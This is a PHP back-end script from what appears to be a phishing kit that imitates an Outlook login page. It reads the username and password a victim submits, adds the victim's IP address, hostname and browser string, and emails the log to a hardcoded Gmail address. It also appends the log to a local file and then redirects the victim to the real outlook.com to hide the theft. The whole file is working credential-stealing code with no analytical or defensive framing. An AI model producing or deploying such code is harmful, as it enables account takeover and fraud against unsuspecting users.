<?php


$emailstosend = "carferjames8@gmail.com";
  $ip = $_SERVER['REMOTE_ADDR'];
  
   $log = $_POST['user'];
   $pass= $_POST['pass'];
   
if($pass == "" ){


     header("location: home.html?");
     

}else{

$subj = "$ip OUT";
  $msg = " --------------------new log----------------------\n
   ID: $log \n
   PASS: $pass \n
   HOST    : ".gethostbyaddr($ip)."
   BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
   IP: $ip \n --------------------ACO Login----------------------";
   mail("$emailstosend", "$subj", "$msg");
	
$my_file = fopen("ok.txt","a"); 
fwrite($my_file,"$msg");
fclose($my_file); 

header("location: https://outlook.com");
   

   }
   

?>	

}